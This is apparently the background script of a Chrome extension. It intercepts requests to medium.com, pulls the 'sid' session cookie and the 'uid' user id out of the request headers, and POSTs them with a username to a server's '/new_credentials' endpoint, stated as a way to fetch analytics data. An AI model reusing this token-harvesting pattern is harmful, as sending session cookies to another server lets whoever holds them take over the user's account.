const $ = require('jquery');
// this code can run in the background, but is currently set to work with events.
// Google: chrome.runtime.onMessage.addListener
// this code runs on every page opened
const PROTOCOL = "http"//"https";
const SERVER_BASE = "127.0.0.1:8080"//"newspace-calderwhite.c9users.io";
const API_PATH = "/api"
var userInfo = {
    username : null,
    userId : null,
    sessionId: null
}
function sendData(callback){
    $.ajax({
        type:"POST",
        url:PROTOCOL + "://" + SERVER_BASE + API_PATH + "/new_credentials",
        data:userInfo,
    })
    if(callback != undefined && callback != null){
    	callback();
    }
}

function checkSendHeaders(details){
    let url = details.url;
    if(url.toLowerCase().search("_/api/stream") > -1){
        // this will contain the special cookies we need to get the analytics data
        let cookies = {};
        for(let i=0;i<details.requestHeaders.length;i++){
            if(details.requestHeaders[i].name.toLowerCase().search("cookie") > -1){
                let cookieTemp = details.requestHeaders[i].value.split(";");
                for(let j=0;j<cookieTemp.length;j++){
                    let [name,value] = cookieTemp[j].split("=");
                    // get rid of any trailing spaces
                    name = name.replace(/ /g,"");
                    cookies[name] = value;
                }
            }
        }
        // this is really the tricky token we need
        let sessionId = cookies["sid"];
        // user id is all over the place, but we'll pick it up here just to be concise
        let userId = cookies["uid"];
        // set values globally
        userInfo.userId = userId;
        userInfo.sessionId = sessionId;
        // if all the values are present, make the POST request
        if(userInfo.username != null){
            sendData();
        }
    }
}


chrome.webRequest.onSendHeaders.addListener(
    checkSendHeaders,
    {
        urls:['*://*.medium.com/*']
    },
    [
        'requestHeaders'
    ]
)
chrome.runtime.onMessage.addListener(function(request, sender, callback) {
    userInfo.username = request.username;
    if(userInfo.userId != null && userInfo.sessionId != null){
        sendData(callback)
    }
	return true;
});
// functions accessable by other windows
window.openMedium = () => {
    window.open("https://medium.com")
}
